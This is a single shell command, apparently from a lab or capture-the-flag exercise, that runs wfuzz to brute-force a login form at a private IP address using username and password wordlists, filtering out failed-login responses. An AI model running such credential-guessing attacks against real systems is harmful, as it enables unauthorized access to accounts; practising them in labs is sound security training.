```sh
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.151.63/login.php -d "username=FUZZ&password=FUZ2Z"
```
